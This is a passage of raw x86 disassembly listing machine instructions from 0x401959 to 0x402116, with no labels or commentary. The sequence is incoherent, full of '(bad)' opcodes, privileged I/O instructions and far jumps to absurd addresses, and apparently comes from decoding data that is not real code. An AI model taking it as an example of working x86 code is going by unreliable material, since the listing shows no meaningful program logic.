  401959:	cwde   
  40195a:	aas    
  40195b:	add    al,0x44
  40195d:	stc    
  40195e:	out    dx,eax
  40195f:	xor    al,0xb8
  401961:	ins    BYTE PTR es:[edi],dx
  401962:	fcmovb st,st(2)
  401964:	xchg   ecx,eax
  401965:	push   eax
  401966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401967:	mov    cl,0xed
  401969:	repz sbb al,0x63
  40196c:	mov    ds:0x5f16838b,al
  401971:	std    
  401972:	icebp  
  401973:	and    BYTE PTR [eax],bl
  401975:	sub    DWORD PTR [esi+esi*2-0x74],esi
  401979:	(bad)  
  40197a:	bound  eax,QWORD PTR [edi-0x109f7012]
  401980:	inc    ebx
  401981:	popa   
  401982:	rcr    BYTE PTR [eax+0x56bf1a52],cl
  401988:	jns    0x40197d
  40198a:	and    edi,DWORD PTR [ecx-0x16705dbd]
  401990:	cmp    eax,0x49294bde
  401995:	js     0x4019dc
  401997:	aaa    
  401998:	mov    ecx,0x3580c1da
  40199d:	imul   esi,esi,0x3c208c5c
  4019a3:	cmc    
  4019a4:	sbb    bh,BYTE PTR [edi-0x1c]
  4019a7:	dec    ebx
  4019a8:	fadd   QWORD PTR [edx+0x235e0a75]
  4019ae:	push   cs
  4019af:	mov    al,0xfd
  4019b1:	mov    al,ds:0xc85b1833
  4019b6:	jl     0x401a02
  4019b8:	mov    ebx,DWORD PTR [ecx]
  4019ba:	add    ebx,ebx
  4019bc:	sbb    dh,BYTE PTR [ecx]
  4019be:	mov    eax,0x67302d94
  4019c3:	retf   
  4019c4:	idiv   BYTE PTR [ebp+0x16]
  4019c7:	cli    
  4019c8:	sub    bl,ch
  4019ca:	in     eax,0xd7
  4019cc:	ds cmp al,0x2c
  4019cf:	(bad)  
  4019d0:	in     al,dx
  4019d1:	dec    esp
  4019d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019d3:	mov    edx,0xedfb6536
  4019d8:	repz clc 
  4019da:	ds ins DWORD PTR es:[edi],dx
  4019dc:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4019de:	jl     0x401a43
  4019e0:	jb     0x401a1a
  4019e2:	adc    BYTE PTR [ebx-0x5e355e2a],dh
  4019e8:	and    DWORD PTR [ecx],esp
  4019ea:	popa   
  4019eb:	out    dx,eax
  4019ec:	sar    DWORD PTR [ecx+0x1cd86998],cl
  4019f2:	hlt    
  4019f3:	inc    esi
  4019f4:	and    BYTE PTR [ebx],dh
  4019f6:	rcl    BYTE PTR [esi-0x76],1
  4019f9:	cmp    BYTE PTR [edi],0x46
  4019fc:	or     bh,cl
  4019fe:	or     eax,0xa979b5ae
  401a03:	add    eax,0xd559d724
  401a08:	bound  ebp,QWORD PTR [edi]
  401a0a:	cmp    eax,0x10beba8a
  401a0f:	fild   DWORD PTR [edi-0x2e]
  401a12:	(bad)  
  401a13:	mov    ds:0x5f206a3b,al
  401a18:	jmp    0xfcd252ae
  401a1d:	push   esp
  401a1e:	outs   dx,DWORD PTR ds:[esi]
  401a1f:	sub    eax,DWORD PTR [ebx+0x118918d1]
  401a25:	mov    esp,0x43191703
  401a2a:	stc    
  401a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a2c:	nop
  401a2d:	imul   ebp,DWORD PTR [ebp-0x4d],0xffffff89
  401a31:	sbb    al,0x80
  401a33:	mov    cl,0xa8
  401a35:	in     al,0xbf
  401a37:	clc    
  401a38:	jno    0x4019e9
  401a3a:	add    esi,DWORD PTR [edx]
  401a3c:	mov    ebx,0xf590e94b
  401a41:	mov    dh,0x8a
  401a43:	stos   DWORD PTR es:[edi],eax
  401a44:	jno    0x4019fe
  401a46:	data16 test BYTE PTR [ecx+0x156e1813],dl
  401a4d:	cmc    
  401a4e:	dec    ebx
  401a4f:	push   eax
  401a50:	mov    esi,0x5af6fb24
  401a55:	inc    ebp
  401a56:	and    al,BYTE PTR [ecx]
  401a58:	icebp  
  401a59:	jb     0x401a8a
  401a5b:	push   ebp
  401a5c:	stos   DWORD PTR es:[edi],eax
  401a5d:	(bad)  [edi-0x36]
  401a60:	mov    ds:0x4afdeca6,al
  401a65:	mov    ecx,0xc8b266ed
  401a6a:	mov    DWORD PTR [esi],edi
  401a6c:	ss loope 0x401a64
  401a6f:	mov    esi,ecx
  401a71:	jl     0x401a80
  401a73:	stos   BYTE PTR es:[edi],al
  401a74:	xchg   edi,eax
  401a75:	mov    dh,BYTE PTR [edi]
  401a77:	repz mov bl,0xca
  401a7a:	mov    al,0x87
  401a7c:	pusha  
  401a7d:	sub    dh,dh
  401a7f:	test   al,0x26
  401a81:	sar    BYTE PTR [ecx],0xf3
  401a84:	test   al,0x4d
  401a87:	dec    esp
  401a88:	les    eax,FWORD PTR [eax+0x44]
  401a8b:	data16 (bad) 
  401a8e:	mov    eax,0x7f92429c
  401a93:	pushf  
  401a94:	out    0xdb,eax
  401a96:	dec    ecx
  401a97:	shr    BYTE PTR ds:0xf4b70578,1
  401a9d:	cmp    BYTE PTR ds:0x1b75a08c,bh
  401aa3:	pop    esp
  401aa4:	mov    esp,0xb3408c4e
  401aa9:	mul    DWORD PTR [edi+ebp*1]
  401aac:	stos   BYTE PTR es:[edi],al
  401aad:	mov    esp,0x4440b7ed
  401ab2:	cld    
  401ab3:	out    dx,al
  401ab4:	pop    edi
  401ab5:	push   0xffffffc1
  401ab7:	cmp    ebx,edx
  401ab9:	fild   WORD PTR [edi+0x66]
  401abc:	popa   
  401abd:	mov    dh,0x24
  401abf:	in     eax,0x95
  401ac1:	jno    0x401ac5
  401ac3:	lods   eax,DWORD PTR ds:[esi]
  401ac4:	les    esi,FWORD PTR [ebx+0x1358e0bc]
  401aca:	lods   al,BYTE PTR ds:[esi]
  401acb:	pop    esp
  401acc:	sahf   
  401acd:	add    al,BYTE PTR [eax]
  401acf:	jge    0x401a60
  401ad1:	and    ah,BYTE PTR [eax-0x22aad703]
  401ad7:	std    
  401ad8:	loopne 0x401b2f
  401ada:	pop    edi
  401adb:	pusha  
  401adc:	push   eax
  401add:	mov    cl,0x67
  401adf:	es test eax,0xb99ea011
  401ae6:	(bad)  
  401ae7:	adc    bh,BYTE PTR [ebx]
  401ae9:	leave  
  401aea:	mov    edx,es
  401aec:	and    ch,ah
  401aee:	(bad)  
  401af0:	jbe    0x401b64
  401af2:	xlat   BYTE PTR ds:[ebx]
  401af3:	xor    BYTE PTR [ebx-0x3d],al
  401af6:	imul   ebx,DWORD PTR [ecx],0xffffffa3
  401af9:	and    cl,BYTE PTR [ebx]
  401afb:	(bad)  
  401afc:	push   edx
  401afd:	jae    0x401a84
  401aff:	daa    
  401b00:	pop    ds
  401b01:	ds call 0xc204:0xac27d29b
  401b09:	and    DWORD PTR [ebx+0x36],ecx
  401b0c:	stos   BYTE PTR es:[edi],al
  401b0d:	loope  0x401b5f
  401b0f:	pop    edi
  401b10:	add    al,al
  401b12:	adc    BYTE PTR [esi+0x4de1cfaa],ah
  401b18:	jns    0x401b7b
  401b1a:	mov    esp,0x90eb89cc
  401b1f:	fisttp WORD PTR ds:0xd906bcda
  401b25:	in     al,dx
  401b26:	jno    0x401aaf
  401b28:	xchg   esp,eax
  401b29:	push   ebp
  401b2a:	pop    ebx
  401b2b:	jmp    0x401abe
  401b2d:	call   0x407fe362
  401b32:	(bad)  
  401b34:	(bad)  
  401b35:	adc    esi,DWORD PTR [esi+eax*8+0x63]
  401b39:	js     0xca840e29
  401b3f:	xchg   ebp,eax
  401b40:	cmp    eax,0xa9a732b0
  401b45:	mov    BYTE PTR [eax],cl
  401b47:	and    DWORD PTR [ecx+0xc9071d9],edi
  401b4d:	je     0x401b12
  401b4f:	imul   eax,DWORD PTR [esi-0x5],0x78010c02
  401b56:	jecxz  0x401bcb
  401b58:	mov    ds:0x557f292e,al
  401b5d:	sbb    eax,0x276560cb
  401b62:	xchg   edi,eax
  401b63:	dec    ebx
  401b64:	outs   dx,BYTE PTR ds:[esi]
  401b65:	std    
  401b66:	nop
  401b67:	xchg   ebx,eax
  401b68:	mov    gs,WORD PTR [edx]
  401b6a:	sub    BYTE PTR [ebx+edi*8+0x10],0xb1
  401b6f:	idiv   DWORD PTR [eax+0x6]
  401b72:	out    0x75,al
  401b74:	fistp  WORD PTR [ebx-0x30ab2636]
  401b7a:	mov    esp,DWORD PTR [edi]
  401b7c:	mov    ds:0xe2e4b75,al
  401b81:	sub    edx,edi
  401b83:	lods   al,BYTE PTR ds:[esi]
  401b84:	div    DWORD PTR [edx-0x68]
  401b87:	dec    ebp
  401b88:	mov    esi,0xa7658d3c
  401b8d:	pop    ebx
  401b8e:	cmp    ecx,DWORD PTR [ecx+eax*4+0x30919426]
  401b95:	jle    0x401b1a
  401b97:	mov    edi,0xd6aeb96d
  401b9c:	and    DWORD PTR ds:0xb17ce659,esi
  401ba2:	push   cs
  401ba3:	lds    ecx,FWORD PTR [ebx-0x2f]
  401ba6:	mov    fs,edx
  401ba8:	mov    edi,0x1480e2ec
  401bad:	mov    gs,WORD PTR [ebx]
  401baf:	push   eax
  401bb0:	test   DWORD PTR [edi-0x69],ebx
  401bb3:	sbb    al,al
  401bb5:	jb     0x401b5f
  401bb7:	adc    al,0x1a
  401bb9:	daa    
  401bba:	fs or  edx,ebx
  401bbd:	shl    DWORD PTR [ecx+0x97b3f2d],1
  401bc3:	sub    dh,BYTE PTR fs:[ecx+0x6]
  401bc7:	jae    0x401b71
  401bc9:	stc    
  401bca:	lahf   
  401bcb:	xchg   DWORD PTR [ecx],ebx
  401bcd:	mov    esp,ecx
  401bcf:	xlat   BYTE PTR ds:[ebx]
  401bd0:	mov    dl,0x66
  401bd2:	dec    edi
  401bd3:	xor    eax,0xa1b68816
  401bd8:	push   ebp
  401bd9:	adc    BYTE PTR [edi],0xe7
  401bdc:	push   ss
  401bdd:	cs scas eax,DWORD PTR es:[edi]
  401bdf:	iret   
  401be0:	sbb    DWORD PTR [ebx],edx
  401be2:	dec    esp
  401be3:	xchg   ebx,eax
  401be4:	rol    esp,1
  401be6:	mov    ebx,0x669c7bf8
  401beb:	inc    esp
  401bec:	push   0xb619fc82
  401bf1:	loope  0x401c65
  401bf3:	xchg   ebx,eax
  401bf4:	push   edx
  401bf5:	(bad)  
  401bf6:	push   ebp
  401bf7:	sub    DWORD PTR [edi-0x5a5a1cd8],ebp
  401bfd:	ret    
  401bfe:	adc    ecx,DWORD PTR [eax-0x7c]
  401c01:	test   al,0x3f
  401c03:	adc    BYTE PTR [esp+ebx*2],dl
  401c06:	out    0xa8,eax
  401c08:	xor    BYTE PTR [esi+0x20fbe06c],bh
  401c0e:	sub    ch,BYTE PTR [edi-0x68]
  401c11:	and    DWORD PTR [ebp+eiz*8-0x3b],ecx
  401c15:	loopne 0x401c46
  401c17:	mov    WORD PTR [edi],es
  401c19:	mov    ebx,0xdb099a00
  401c1e:	fst    DWORD PTR [ebx-0x71e6f5ad]
  401c24:	sbb    DWORD PTR cs:[esi],ebp
  401c27:	mov    esi,0x80a542a4
  401c2c:	pushf  
  401c2d:	sub    al,0x94
  401c2f:	ficomp WORD PTR [edx]
  401c31:	imul   esp,DWORD PTR [ecx+0x266cc16b],0x1
  401c38:	dec    esp
  401c39:	mov    ecx,0xa9ea7c96
  401c3e:	mov    bh,0x4a
  401c40:	xchg   BYTE PTR [ebp+0x1a],cl
  401c43:	in     al,0xf1
  401c45:	mov    ecx,0x8f9228a6
  401c4a:	pop    ebx
  401c4b:	mov    al,BYTE PTR [edi+esi*4]
  401c4e:	push   esi
  401c4f:	jne    0x401c44
  401c51:	cmp    BYTE PTR [ecx+0xf],cl
  401c54:	ja     0x401c53
  401c56:	xchg   ebx,eax
  401c57:	cmp    BYTE PTR [ebx+0x3c4338f],ch
  401c5d:	sub    BYTE PTR [edi],cl
  401c5f:	ja     0x401c97
  401c61:	and    ebx,ecx
  401c63:	aad    0x49
  401c65:	bound  eax,QWORD PTR [edi]
  401c67:	mov    bl,cl
  401c69:	rol    BYTE PTR [ebp-0x16],1
  401c6c:	shl    edx,0x57
  401c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c70:	push   ebx
  401c71:	nop
  401c72:	push   esp
  401c73:	pop    ebx
  401c74:	dec    eax
  401c75:	pop    ds
  401c76:	call   0x9d23ab56
  401c7b:	push   ds
  401c7c:	call   0xbc44:0x45721573
  401c83:	(bad)  
  401c84:	addr16 push esp
  401c86:	aaa    
  401c87:	or     DWORD PTR [ecx],esi
  401c89:	adc    al,0xc5
  401c8b:	cmp    al,0x6c
  401c8d:	inc    ebx
  401c8e:	out    0x64,al
  401c90:	xor    eax,DWORD PTR [ebx]
  401c92:	(bad)  
  401c93:	aad    0x18
  401c95:	aad    0x2
  401c97:	xor    edi,DWORD PTR [bp+si+0x25]
  401c9b:	imul   edx,DWORD PTR [esi-0x44b1571f],0xffffffd6
  401ca2:	enter  0x620d,0xf4
  401ca6:	imul   edx,DWORD PTR ds:0x3fe08db2,0xdf924b38
  401cb0:	(bad)  [ecx]
  401cb2:	mov    ds:0x6f11e65a,eax
  401cb7:	fs xchg ecx,eax
  401cb9:	rcl    DWORD PTR [edi-0x75c596cc],1
  401cbf:	(bad)  
  401cc0:	pop    esp
  401cc1:	xor    al,0xff
  401cc3:	push   eax
  401cc4:	xlat   BYTE PTR ds:[ebx]
  401cc5:	and    eax,0x73
  401cc8:	pop    ebp
  401cc9:	fiadd  WORD PTR [edi-0x78]
  401ccc:	ret    
  401ccd:	into   
  401cce:	int3   
  401ccf:	mov    es,WORD PTR [esi+esi*2-0x73]
  401cd3:	jo     0x401cb4
  401cd5:	cwde   
  401cd6:	iret   
  401cd7:	shl    BYTE PTR [eax-0x7d],cl
  401cda:	mov    al,0x3a
  401cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cdd:	jnp    0x401c71
  401cdf:	pop    es
  401ce0:	inc    esp
  401ce1:	sub    DWORD PTR [ecx+eax*2+0x7d],esp
  401ce5:	and    ah,BYTE PTR [esi+0x53]
  401ce8:	mov    BYTE PTR [edx+0x70],dh
  401ceb:	cmp    eax,0xffffffdb
  401cee:	mov    dl,0x8
  401cf0:	dec    eax
  401cf1:	leave  
  401cf2:	mov    al,0x72
  401cf4:	sbb    edi,DWORD PTR [ebx]
  401cf6:	pop    ebx
  401cf7:	pushf  
  401cf8:	xchg   DWORD PTR ds:0xe72ac71d,ebx
  401cfe:	mov    BYTE PTR [esi-0x60e241f4],cl
  401d04:	ins    BYTE PTR es:[edi],dx
  401d05:	popf   
  401d06:	sbb    BYTE PTR [ecx+edx*8],bh
  401d09:	push   0xa2ecec26
  401d0e:	jb     0x401d8d
  401d10:	pop    es
  401d11:	add    edi,DWORD PTR [bp+di+0x69d7]
  401d16:	push   edi
  401d17:	loope  0x401cb2
  401d19:	and    bh,BYTE PTR [edi]
  401d1b:	arpl   WORD PTR [esi-0x6],di
  401d1e:	dec    esp
  401d1f:	call   0x5749:0x647a134f
  401d26:	xchg   ecx,eax
  401d27:	push   ecx
  401d28:	jle    0x401ce8
  401d2a:	pop    edx
  401d2b:	lea    esi,[eax+0x6]
  401d2e:	(bad)  
  401d2f:	arpl   WORD PTR [edx],di
  401d31:	mov    bh,BYTE PTR [edx]
  401d33:	fs aas 
  401d35:	mov    ds:0xaeb9531b,eax
  401d3a:	mov    ebx,0x38a8578
  401d3f:	dec    edi
  401d40:	std    
  401d41:	inc    edx
  401d42:	dec    esi
  401d43:	inc    edi
  401d44:	test   al,0x19
  401d46:	es pop es
  401d48:	push   esp
  401d49:	push   ds
  401d4a:	cwde   
  401d4b:	nop
  401d4c:	sub    esi,0x85febf60
  401d52:	xchg   edi,eax
  401d53:	fwait
  401d54:	lods   eax,DWORD PTR ds:[esi]
  401d55:	inc    ebp
  401d56:	psrlw  mm2,QWORD PTR [edx-0x5a5a54fb]
  401d5d:	cwde   
  401d5e:	mov    ah,0x9b
  401d60:	shl    al,cl
  401d62:	or     al,0x13
  401d64:	rcr    cl,1
  401d66:	sbb    DWORD PTR ds:0x8874d071,esp
  401d6c:	lock jge 0x401db1
  401d6f:	ja     0x401d09
  401d71:	pop    esp
  401d72:	sub    BYTE PTR [eax-0x61be7449],ah
  401d78:	or     esp,edi
  401d7a:	lods   al,BYTE PTR ds:[esi]
  401d7b:	jns    0x401da6
  401d7d:	mov    eax,ds:0xb73453ea
  401d82:	push   esp
  401d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d84:	mov    edi,0x3f73b569
  401d89:	pusha  
  401d8a:	push   ebx
  401d8b:	fld    DWORD PTR ds:0x5bc56da5
  401d91:	dec    ebp
  401d92:	das    
  401d93:	xchg   DWORD PTR [esp-0x3c],esp
  401d97:	inc    edx
  401d98:	inc    ebx
  401d99:	pop    esi
  401d9a:	mov    bl,0x3e
  401d9c:	sub    eax,0xcbea9200
  401da1:	mov    ebx,0xde22ab02
  401da6:	hlt    
  401da7:	or     al,0xa3
  401da9:	out    0x6b,eax
  401dab:	push   esi
  401dac:	sbb    BYTE PTR ds:0x886e1876,0xae
  401db3:	dec    esp
  401db4:	and    ebx,DWORD PTR ds:[ebp-0x406e4884]
  401dbb:	call   0xf7d141da
  401dc0:	stos   BYTE PTR es:[edi],al
  401dc1:	mov    esp,0x415b42a8
  401dc6:	add    ebx,DWORD PTR [ebx+0x50]
  401dc9:	rol    BYTE PTR [eax+0x57ee30e5],0x33
  401dd0:	stc    
  401dd1:	xor    ah,bh
  401dd3:	repz adc BYTE PTR [ecx+ebp*2],cl
  401dd7:	jge    0x401dda
  401dd9:	jmp    ecx
  401ddb:	mov    bh,0x4e
  401ddd:	sub    DWORD PTR ds:0xc5e57fac,esp
  401de3:	add    ebp,ebp
  401de5:	in     eax,dx
  401de6:	mov    ebx,0xf0230ae0
  401deb:	mov    eax,0x77223da
  401df0:	mov    bl,0x3
  401df2:	lock sub dl,BYTE PTR [edi+esi*4+0x68]
  401df7:	sub    esi,DWORD PTR [esi-0x66a71484]
  401dfd:	adc    al,0x3e
  401dff:	cmp    bh,BYTE PTR ds:0x37b6924
  401e05:	cwde   
  401e06:	std    
  401e07:	pop    ss
  401e08:	jns    0x401e35
  401e0a:	test   DWORD PTR [eax+0x4d489105],edi
  401e10:	xchg   esp,eax
  401e11:	cs and cl,dl
  401e14:	ins    DWORD PTR es:[edi],dx
  401e15:	clc    
  401e16:	cmp    edx,ebx
  401e18:	sub    esi,DWORD PTR ds:0x3bb4d598
  401e1e:	cmp    esi,DWORD PTR [edx+0xb]
  401e21:	push   es
  401e22:	inc    edx
  401e23:	pop    esi
  401e24:	ss loope 0x401dba
  401e27:	hlt    
  401e28:	mov    eax,ds:0xa4dd2273
  401e2d:	jae    0x401e41
  401e2f:	xor    BYTE PTR [edi+0x51],0xc
  401e33:	cmp    eax,DWORD PTR [edi+0x7f1abb50]
  401e39:	sub    al,0xd5
  401e3b:	je     0x401e41
  401e3d:	dec    eax
  401e3e:	cmp    eax,0xd9ca0c51
  401e43:	xlat   BYTE PTR ds:[ebx]
  401e44:	xchg   ecx,eax
  401e45:	inc    bl
  401e47:	cmp    al,0x1d
  401e49:	push   0xff49016c
  401e4e:	repz jmp 0x8de5:0x850410f5
  401e56:	ret    
  401e57:	mov    esp,0xe2a43f29
  401e5c:	and    cl,BYTE PTR [eax]
  401e5e:	sbb    al,0x85
  401e60:	inc    esi
  401e61:	jg     0x401df6
  401e63:	sub    ecx,DWORD PTR [edi+0x6349116f]
  401e69:	pop    ecx
  401e6a:	retf   0xacc7
  401e6d:	ins    DWORD PTR es:[edi],dx
  401e6e:	fimul  WORD PTR [esi]
  401e70:	or     al,0xd9
  401e72:	or     eax,0xa10af902
  401e77:	mov    WORD PTR [esi-0xd],ax
  401e7b:	adc    DWORD PTR [eax-0x34785c7b],esi
  401e81:	mov    edx,0xb93d1966
  401e86:	iret   
  401e87:	scas   eax,DWORD PTR es:[edi]
  401e88:	(bad)  
  401e89:	call   0x79e43939
  401e8e:	adc    esp,DWORD PTR [ecx]
  401e90:	push   cs
  401e91:	lods   eax,DWORD PTR ds:[esi]
  401e92:	stc    
  401e93:	xor    esi,DWORD PTR [esi-0x3f]
  401e96:	repnz and al,0x5c
  401e99:	jmp    0xf3ba:0x5698fa
  401ea0:	jb     0x401ebd
  401ea2:	jae    0x401e90
  401ea4:	add    BYTE PTR [edx+0x42120369],0x57
  401eab:	sub    al,0x85
  401ead:	mov    esp,0xe342b4c0
  401eb2:	sar    edx,1
  401eb4:	and    al,0xaf
  401eb6:	or     eax,DWORD PTR [edx-0x10]
  401eb9:	std    
  401eba:	scas   al,BYTE PTR es:[edi]
  401ebb:	mov    edx,0x487856ad
  401ec0:	or     al,0x32
  401ec2:	sbb    BYTE PTR [edx-0x7c],bh
  401ec5:	mov    eax,0xd1988be3
  401eca:	jle    0x401f05
  401ecc:	cwde   
  401ecd:	popa   
  401ece:	mov    WORD PTR [eax],es
  401ed0:	loop   0x401e7b
  401ed2:	push   0x35
  401ed4:	xchg   ebx,eax
  401ed5:	(bad)
  401ed9:	cmp    al,al
  401edb:	(bad)  
  401edc:	mov    dh,0x14
  401ede:	sub    BYTE PTR [edx-0x48a80376],0x16
  401ee5:	jl     0x401f3a
  401ee7:	jnp    0x401f63
  401ee9:	cmp    al,0x15
  401eeb:	inc    esp
  401eec:	lea    ecx,[edi-0x20]
  401eef:	push   0x5c5bc55e
  401ef4:	jb     0x401f08
  401ef6:	fstp   TBYTE PTR [edx-0x48]
  401ef9:	loope  0x401e94
  401efb:	bound  eax,QWORD PTR [esi-0x11]
  401efe:	scas   al,BYTE PTR es:[edi]
  401eff:	std    
  401f00:	int3   
  401f01:	add    edi,DWORD PTR [esi]
  401f03:	repz mov esp,0x7c5e8c89
  401f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0a:	push   esp
  401f0b:	xchg   edx,eax
  401f0c:	xchg   DWORD PTR [ecx],ebx
  401f0e:	cwde   
  401f0f:	xor    BYTE PTR [esi-0x5248cc5],al
  401f15:	jle    0x401f12
  401f17:	xlat   BYTE PTR ds:[ebx]
  401f18:	js     0x401eaa
  401f1a:	sar    DWORD PTR [edx+0x7fb155e4],1
  401f20:	jo     0x401eae
  401f22:	pop    ds
  401f23:	mov    ah,bl
  401f25:	and    eax,0x60759555
  401f2a:	aaa    
  401f2b:	pop    edx
  401f2c:	pusha  
  401f2d:	(bad)  
  401f2e:	clc    
  401f2f:	pop    edx
  401f30:	fcmovnu st,st(1)
  401f32:	pop    ebx
  401f33:	or     al,BYTE PTR [esi-0x42]
  401f36:	mov    ecx,0x4f819a1e
  401f3b:	jmp    0x42f0d15
  401f40:	dec    DWORD PTR [ebx+0x4e031e8a]
  401f46:	aaa    
  401f47:	int    0x85
  401f49:	loopne 0x401f72
  401f4b:	cmp    BYTE PTR [ecx],bl
  401f4d:	ins    DWORD PTR es:[edi],dx
  401f4e:	bound  ebx,QWORD PTR [edx]
  401f50:	sbb    al,0x77
  401f52:	dec    esi
  401f53:	cmp    bl,BYTE PTR [esi]
  401f55:	outs   dx,DWORD PTR ds:[esi]
  401f56:	into   
  401f57:	bound  eax,QWORD PTR [edi-0x28]
  401f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f5b:	adc    ecx,DWORD PTR [ebx]
  401f5d:	mov    WORD PTR [ecx+ecx*1-0x761a7cb6],es
  401f64:	call   0x81e8:0x6c97d0a5
  401f6b:	sub    eax,0x58b5ab29
  401f70:	adc    BYTE PTR [ebp+ecx*2-0x41],ch
  401f74:	pop    ecx
  401f75:	push   ds
  401f76:	mov    edi,0x8d2264f2
  401f7b:	lods   al,BYTE PTR ds:[esi]
  401f7c:	es jo  0x401f74
  401f7f:	test   esi,edi
  401f81:	pop    edi
  401f82:	mov    BYTE PTR [eax],bh
  401f84:	das    
  401f85:	push   esp
  401f86:	dec    edi
  401f87:	pop    edx
  401f88:	dec    ebx
  401f89:	mov    bh,0x38
  401f8b:	ret    
  401f8c:	cmp    eax,0xe1ff03eb
  401f91:	retf   
  401f92:	mov    ds:0xeed6f2ad,al
  401f97:	mov    ebp,0xa1d29737
  401f9c:	fadd   DWORD PTR [eax-0x43bd3cea]
  401fa2:	jl     0x401fb6
  401fa4:	sar    DWORD PTR [eax+ebp*8+0x46a417c],1
  401fab:	pop    ebx
  401fac:	xor    al,0xe8
  401fae:	cmp    BYTE PTR [edi-0x1dd14148],dl
  401fb4:	imul   esi,DWORD PTR [ecx+0x19008964],0xa2782a1b
  401fbe:	sub    eax,0xafdbb788
  401fc3:	out    0x66,eax
  401fc5:	fistp  WORD PTR [esp+eax*2]
  401fc8:	inc    eax
  401fc9:	push   edi
  401fca:	popa   
  401fcb:	adc    bl,BYTE PTR [eax-0x10]
  401fce:	int    0x1f
  401fd0:	aas    
  401fd1:	jmp    0x401fd1
  401fd3:	mov    ebp,ebx
  401fd5:	mov    gs,WORD PTR [edi+edx*2]
  401fd8:	xor    al,0x6d
  401fda:	sub    edx,DWORD PTR [edi]
  401fdc:	call   0xc9046718
  401fe1:	xor    esp,DWORD PTR [esi]
  401fe3:	pop    ebx
  401fe4:	inc    edx
  401fe5:	jns    0x402023
  401fe7:	add    edx,DWORD PTR [edi-0x7b]
  401fea:	xchg   edx,eax
  401feb:	add    eax,0xee47b9f8
  401ff0:	push   eax
  401ff1:	mov    dh,0xb9
  401ff3:	stos   DWORD PTR es:[edi],eax
  401ff4:	(bad)  
  401ff5:	dec    eax
  401ff6:	xchg   esi,eax
  401ff7:	jp     0x40204d
  401ff9:	out    0xc2,al
  401ffb:	popa   
  401ffc:	xchg   ebx,eax
  401ffd:	xchg   edi,eax
  401ffe:	mov    al,ds:0xd8136066
  402003:	outs   dx,DWORD PTR ds:[esi]
  402004:	(bad)  
  402005:	hlt    
  402006:	das    
  402007:	xchg   ebp,eax
  402008:	add    al,0xfd
  40200a:	retf   
  40200b:	inc    ecx
  40200c:	sub    esp,edi
  40200e:	pop    edi
  40200f:	jmp    0xfc2c:0xd9cec5ec
  402016:	and    eax,0xaa738bfa
  40201b:	jnp    0x401ffd
  40201d:	mov    eax,0x6993335b
  402022:	out    dx,al
  402023:	cmp    DWORD PTR [edx+0x633363a7],ecx
  402029:	retf   
  40202a:	inc    esp
  40202b:	xor    eax,0xf2bb5c0f
  402030:	sub    eax,0x5abafac9
  402035:	cmp    BYTE PTR [ecx],ch
  402037:	call   0x674153c8
  40203c:	test   al,0x1f
  40203e:	arpl   WORD PTR [eax+0x67],cx
  402041:	xor    edi,DWORD PTR [esi+ecx*2+0x2a]
  402045:	mov    esp,0xc56fa186
  40204a:	hlt    
  40204b:	popa   
  40204c:	inc    esp
  40204d:	test   BYTE PTR ds:0x7904d383,dh
  402053:	inc    BYTE PTR [ebp+edi*1+0x49]
  402057:	(bad)  
  402058:	in     eax,0x72
  40205a:	std    
  40205b:	outs   dx,DWORD PTR ds:[esi]
  40205c:	sub    eax,0xd53493f
  402061:	outs   dx,DWORD PTR ds:[esi]
  402062:	xor    eax,0x2316908e
  402067:	dec    eax
  402068:	xor    eax,0xd2c7a4ee
  40206d:	sar    DWORD PTR [eax],1
  40206f:	mov    dh,BYTE PTR [ebx]
  402071:	sahf   
  402072:	into   
  402073:	or     edi,DWORD PTR ds:0xea39c2c9
  402079:	inc    ebx
  40207a:	cmp    al,0x5d
  40207c:	stc    
  40207d:	inc    ecx
  40207e:	adc    eax,0x38aece40
  402083:	out    dx,al
  402084:	lods   al,BYTE PTR ds:[esi]
  402085:	xlat   BYTE PTR ds:[ebx]
  402086:	and    BYTE PTR [edx+esi*8-0x1c],ch
  40208a:	and    eax,0x5cbc92a1
  40208f:	adc    dl,bl
  402091:	aam    0x61
  402093:	aad    0xbc
  402095:	pop    ecx
  402096:	das    
  402097:	push   ds
  402098:	jnp    0x4020ec
  40209a:	jns    0x4020ef
  40209c:	fsub   QWORD PTR [esi+edx*2-0x4d29357]
  4020a3:	mov    esi,0xc701907f
  4020a8:	xchg   ebp,eax
  4020a9:	adc    edx,DWORD PTR [edx-0x35]
  4020ac:	sub    DWORD PTR [ebx+0x10],esi
  4020af:	or     ebx,DWORD PTR [ebp-0x6dc3e916]
  4020b5:	cdq    
  4020b6:	inc    esp
  4020b7:	push   ebx
  4020b8:	(bad)  
  4020b9:	lods   eax,DWORD PTR ds:[esi]
  4020ba:	ins    DWORD PTR es:[edi],dx
  4020bb:	or     ah,al
  4020bd:	bound  edx,QWORD PTR [edx]
  4020bf:	sbb    al,0x97
  4020c1:	mov    ecx,0x77c699cc
  4020c6:	and    DWORD PTR [ecx],esi
  4020c8:	push   es
  4020c9:	(bad)  
  4020cb:	int    0x9f
  4020cd:	inc    ecx
  4020ce:	cld    
  4020cf:	call   0xaadd:0xb4434e98
  4020d6:	mov    esp,0x67d641a6
  4020db:	add    BYTE PTR [edx],bl
  4020dd:	xchg   ecx,eax
  4020de:	clc    
  4020df:	sbb    edi,DWORD PTR [edi-0x161aa1f6]
  4020e5:	add    dh,BYTE PTR [ebx+0x31]
  4020e8:	mov    ebp,0x907fcea2
  4020ed:	rcl    ebx,1
  4020ef:	cdq    
  4020f0:	test   BYTE PTR [ebp-0x2138765b],bh
  4020f6:	test   BYTE PTR [edx+esi*8-0x244a634a],0x5
  4020fe:	pop    es
  4020ff:	ins    BYTE PTR es:[edi],dx
  402100:	jl     0x402120
  402102:	(bad)  
  402103:	pushf  
  402104:	mov    WORD PTR [ecx],cs
  402106:	stos   BYTE PTR es:[edi],al
  402107:	or     BYTE PTR [ecx-0x25575070],dl
  40210d:	out    dx,eax
  40210e:	mov    eax,DWORD PTR [ecx]
  402110:	sub    BYTE PTR [ebp-0x2e3f9bd0],ah
  402116:	mov    ebp,0x2445384d
